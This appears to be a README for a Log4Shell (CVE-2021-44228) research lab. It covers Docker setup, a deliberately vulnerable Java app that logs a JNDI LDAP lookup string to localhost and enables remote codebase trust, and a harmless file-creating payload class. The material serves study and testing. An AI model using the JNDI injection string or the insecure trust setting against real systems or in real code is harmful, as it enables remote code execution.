# CVE-2021-44228 Log4j RCE (Log4Shell) Research Lab

## Docker Deployment

### Clone Repo

```
git clone https://github.com/Cyb3rWard0g/log4jshell-lab
```
### Create Local Socket Proxy

```
docker network create --gateway 192.168.55.1 --subnet 192.168.55.0/24 socket_proxy
```

### Run Docker Compose File

```
docker-compose -f docker-compose.yml up --build -d
```

### Check Docker Containers

```
docker ps

docker logs --follow ldap-server

docker logs --follow web-server
```

## Run Vulnerable App

### Compile

```
cd vulnApp
mvn -f pom.xml clean package -DskipTests
```

## Run

```
java -cp target/Log4jLabProject-1.0-SNAPSHOT-all.jar  com.log4jshell.App
```

## Files

### Vuln App

```
package com.log4jshell;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class App {
    private static final Logger logger = LogManager.getLogger(App.class);
    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        logger.error("${jndi:ldap://127.0.0.1:1389/CreateFile}");
    }
}
```

## CreateFile Payload

```
import java.io.File;  // Import the File class
import java.io.IOException;  // Import the IOException class to handle errors

public class CreateFile {
    public CreateFile() {}
    static {
      try {
        File myObj = new File("filename.txt");
        if (myObj.createNewFile()) {
          System.out.println("File created: " + myObj.getName());
        } else {
          System.out.println("File already exists.");
        }
      } catch (IOException e) {
        System.out.println("An error occurred.");
        e.printStackTrace();
      }
    }
    public static void main(String[] args) {
        CreateFile e = new CreateFile();
    }
}
```

## References
* https://www.smarthomebeginner.com/traefik-docker-security-best-practices/#9_Use_a_Docker_Socket_Proxy